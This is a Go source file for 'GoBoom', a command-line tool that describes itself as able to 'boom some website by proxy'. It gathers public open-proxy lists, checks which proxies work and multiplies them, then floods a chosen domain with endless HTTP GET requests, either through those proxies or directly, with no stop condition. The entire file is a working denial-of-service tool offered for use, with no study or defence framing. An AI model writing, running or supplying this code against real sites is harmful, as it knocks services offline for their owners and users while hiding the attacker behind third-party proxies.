package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/akamensky/argparse"
)

var statusCodeToEscape = []string{
	// "503 Too many open connections",
	// "401 Unauthorized",
	// "409 Conflict",
	// "404 Not Found",
	// "502 Bad Gateway",
	// "504 Gateway Timeout",
	// "407 Proxy Authentication Required",
	// "400 Bad Request",
	// "502 Proxy Error",
	// "403 Forbidden",
	// "503 Service Unavailable",
	// "504 DNS Name Not Found",
	// "407 Unauthorized",
	// "405 Method Not Allowed",
}

func getProxyList_github(link string) []string {
	//format of the list is ip:port
	//return a list of proxy
	resp, err := http.Get(link)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	//read the body of the response
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	proxy_list := strings.Replace(string(body), "\r", "", -1)
	return strings.Split(proxy_list, "\n")
}

type Proxy_genode struct {
	Data []struct {
		ID                 string      `json:"_id"`
		IP                 string      `json:"ip"`
		AnonymityLevel     string      `json:"anonymityLevel"`
		Asn                string      `json:"asn"`
		City               string      `json:"city"`
		Country            string      `json:"country"`
		CreatedAt          time.Time   `json:"created_at"`
		Google             bool        `json:"google"`
		Isp                string      `json:"isp"`
		LastChecked        int         `json:"lastChecked"`
		Latency            float32     `json:"latency"`
		Org                string      `json:"org"`
		Port               string      `json:"port"`
		Protocols          []string    `json:"protocols"`
		Region             interface{} `json:"region"`
		ResponseTime       int         `json:"responseTime"`
		Speed              int         `json:"speed"`
		UpdatedAt          time.Time   `json:"updated_at"`
		WorkingPercent     interface{} `json:"workingPercent"`
		UpTime             float64     `json:"upTime"`
		UpTimeSuccessCount int         `json:"upTimeSuccessCount"`
		UpTimeTryCount     int         `json:"upTimeTryCount"`
	} `json:"data"`
	Total int `json:"total"`
	Page  int `json:"page"`
	Limit int `json:"limit"`
}

func getProxyList_genode() []string {
	// get the list of proxy at https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&filterUpTime=80&protocols=http%2Chttps&anonymityLevel=elite
	// return a list of proxy
	var proxy_list []string
	resp, err := http.Get("https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&protocols=http%2Chttps&anonymityLevel=elite&anonymityLevel=anonymous")
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	//read the body of the response
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	var proxy_genode Proxy_genode
	err = json.Unmarshal(body, &proxy_genode)
	if err != nil {
		log.Fatal(err)
	}
	for _, proxy := range proxy_genode.Data {
		proxy_list = append(proxy_list, proxy.IP+":"+proxy.Port)
	}
	return proxy_list
}

func getProxyList_file(path string) []string {
	//format of the list is ip:port
	//return a list of proxy
	file, err := os.Open(path)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	//read the body of the response
	body, err := ioutil.ReadAll(file)
	if err != nil {
		log.Fatal(err)
	}

	proxy_list := strings.Replace(string(body), "\r", "", -1)
	return strings.Split(proxy_list, "\n")
}

func chunkSlice(s []string, total_to_divided int) [][]string {
	var divided [][]string
	var chunk = float32(len(s) / total_to_divided)
	var start, end = 0, 0
	for i := 0; i < total_to_divided; i++ {
		end = start + int(chunk)
		if end > len(s) {
			end = len(s)
		}
		divided = append(divided, s[start:end])
		start = end
	}
	return divided
}

func stringInSlice(a string, list []string) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func handlerProxy(domain, proxy string) string {
	//just connect to the website and check the status code
	//use proxy to connect
	//format of proxy is ip:port
	//format of domain is domain.com
	proxyUrl, err := url.Parse("http://" + proxy)
	if err != nil {
		return "error"
	}
	//create a new http client
	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyUrl),
		}}
	//set http client like a mozilla browser
	//client timeout after 1 second
	client.Timeout = time.Millisecond * 1000
	//connect to the website
	resp, err := client.Get("http://" + domain)
	if err != nil {
		return "error"
	}
	defer resp.Body.Close()
	//if resp is 503 too many connection
	// make [][]string statusCodeToEscape
	if stringInSlice(resp.Status, statusCodeToEscape) {
		return "error"
	}
	if resp.StatusCode != 0 {
		//fmt.Println(resp.Status)
		return resp.Status
	} else {
		return "error"
	}
}

func handler(domain string) string {
	//just connect to the website and check the status code
	//format of domain is domain.com
	//create a new http client
	client := &http.Client{}
	//set http client like a mozilla browser
	client.Timeout = time.Millisecond * 100
	//connect to the website
	resp, err := client.Get("http://" + domain)
	if err != nil {
		return "error"
	}
	defer resp.Body.Close()
	//if resp is 503 too many connection
	// make [][]string statusCodeToEscape
	if stringInSlice(resp.Status, statusCodeToEscape) {
		return "error"
	}
	if resp.StatusCode != 0 {
		//fmt.Println(resp.Status)
		return resp.Status
	} else {
		return "error"
	}
}

func removeDuplicates(elements []string) []string {
	// Use map to record duplicates as we find them.
	encountered := map[string]bool{}
	result := []string{}

	for v := range elements {
		if encountered[elements[v]] == true {
			// Do not add duplicate.
		} else {
			// Record this element as an encountered element.
			encountered[elements[v]] = true
			// Append to result slice.
			result = append(result, elements[v])
		}
	}
	// Return the new slice.
	return result
}

func add_good_proxy(proxy string, good_proxy []string) []string {
	var mutex = &sync.Mutex{}
	mutex.Lock()
	good_proxy = append(good_proxy, proxy)
	mutex.Unlock()
	return good_proxy
}

func check_host_up(domain string) bool {
	//check if the host is up
	_, err := net.LookupHost(domain)
	if err != nil {
		return false
	}
	return true
}

func test_proxy(proxy_file []string) []string {
	var good_proxy []string
	//get the list of proxy
	proxy_list := getProxyList_genode()
	proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt")...)
	proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt")...)
	proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt")...)
	proxy_list = append(proxy_list, getProxyList_github("https://github.com/monosans/proxy-list/blob/main/proxies/http.txt")...)

	if len(proxy_file) > 0 {
		for _, file := range proxy_file {
			proxy_list = append(proxy_list, getProxyList_file(file)...)
		}
	}

	//remove duplicate
	proxy_list = removeDuplicates(proxy_list)
	fmt.Println("Total proxy : ", len(proxy_list))
	threads := 500
	//chunk the list of proxy
	proxy_list_chunk := chunkSlice(proxy_list, threads)
	domain := "github.com"
	wg2 := sync.WaitGroup{}
	fmt.Println("Checking proxy...")
	for _, proxy := range proxy_list_chunk {
		wg2.Add(1)
		go func(proxy []string) {
			defer wg2.Done()
			for _, p := range proxy {
				result := handlerProxy(domain, p)
				//if more than 5 seconde, the proxy is not good
				if result == "200 OK" || result == "200" {
					good_proxy = add_good_proxy(p, good_proxy)
				}
			}
		}(proxy)
	}
	wg2.Wait()

	return good_proxy
}

func main() {
	parser := argparse.NewParser("GoBoom", "Boom some website by proxy")
	domain := parser.String("d", "domain", &argparse.Options{Required: true, Help: "Domain to boom"})
	threads := parser.String("t", "threads", &argparse.Options{Required: false, Help: "Number of threads", Default: "max"})
	proxy_file := parser.StringList("p", "proxy-file", &argparse.Options{Required: false, Help: "Proxy file(s), separate with a ',' each files. Format of file(s) must be ip:port", Default: []string{}})
	proxy_mult := parser.Int("x", "proxy-mult", &argparse.Options{Required: false, Help: "You can multiply the working proxys detected with this option", Default: 12})
	mode := parser.Int("m", "mode", &argparse.Options{Required: false, Help: "Mode of attack, 1 for pass all traffic trough proxy, 2 don't use proxy", Default: 1})
	err := parser.Parse(os.Args)
	if err != nil {
		fmt.Print(parser.Usage(err))
		os.Exit(1)
	}
	if !check_host_up(*domain) {
		fmt.Println("The domain or ip is not up")
		os.Exit(1)
	}
	//select mode 1 or 2
	if *mode == 1 {
		for _, p := range *proxy_file {
			//split all the files by comma
			if strings.Contains(p, ",") {
				*proxy_file = strings.Split(p, ",")
			} else {
				*proxy_file = append(*proxy_file, p)
			}
		}
		proxy_list := test_proxy(*proxy_file)
		var proxy_list_temp []string
		fmt.Println("Good proxy : ", len(proxy_list))
		for i := 0; i < *proxy_mult; i++ {
			proxy_list_temp = append(proxy_list_temp, proxy_list...)
			//if last
			if i == *proxy_mult-1 {
				proxy_list = proxy_list_temp
			}
		}

		//get the list of proxy
		fmt.Println("Total proxy after multiplication :", len(proxy_list))
		fmt.Println("Starting attack in 5 seconds...")
		time.Sleep(5 * time.Second)
		threads_int := 10

		if *threads != "max" {
			threads_int, err = strconv.Atoi(*threads)
			if err != nil {
				fmt.Println("Error : threads must be a number")
				os.Exit(1)
			}
		} else {
			threads_int = len(proxy_list)
		}
		if threads_int > len(proxy_list) {
			threads_int = len(proxy_list)
			fmt.Println("Apply max threads")
		}
		//chunk the proxy list
		chunked_proxy_list := chunkSlice(proxy_list, threads_int)
		//start the threads
		//create a channel list of good proxy
		for {
			var wg sync.WaitGroup
			for _, chunk := range chunked_proxy_list {
				wg.Add(1)
				go func(chunk []string) {
					defer wg.Done()
					for _, proxy := range chunk {
						for {
							//time.Sleep(time.Millisecond * 100)
							status := handlerProxy(*domain, proxy)
							if status != "error" {
								fmt.Println(status, "time :", time.Now().Format("15:04:05.000"))
								continue
							} else {
								continue
							}

						}
						//fmt.Println("Thread died")
						//return
					}
				}(chunk)
			}
			wg.Wait()
			fmt.Println("All threads are dead, restarting")
		}
	} else if *mode == 2 {
		threads_int, err := strconv.Atoi(*threads)
		if err != nil {
			fmt.Println("Error : threads must be a number")
			os.Exit(1)
		}
		for {
			var wg sync.WaitGroup
			for i := 0; i < threads_int; i++ {
				wg.Add(1)
				go func() {
					//use func handler
					defer wg.Done()
					for {
						status := handler(*domain)
						if status != "error" {
							fmt.Println(status, "time :", time.Now().Format("15:04:05.000"))
							continue
						} else {
							continue
						}
					}
				}()
			}
			wg.Wait()
			fmt.Println("All threads are dead, restarting")
		}
	}

}
